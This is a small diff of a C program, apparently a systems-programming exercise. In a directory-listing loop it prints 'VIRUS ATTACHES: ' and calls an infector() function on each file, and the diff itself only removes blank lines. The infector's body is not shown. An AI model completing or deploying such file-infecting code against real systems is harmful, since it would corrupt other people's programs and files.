@@ -49,13 +49,11 @@ int main (int argc , char* argv[], char* envp[])
             system_call(SYS_WRITE, STDOUT, "VIRUS ATTACHES: ", 16);
             infector(entp->buf);
         }
-
         if ((entp->buf[0] != '.') && (strcmp(entp->buf, ".") != 0) && (strcmp(entp->buf, "..") != 0))
         {
             system_call(SYS_WRITE, STDOUT, entp->buf, strlen(entp->buf));
             system_call(SYS_WRITE, STDOUT, "\n", 1);
         }
     }
-
     return 0;
 }
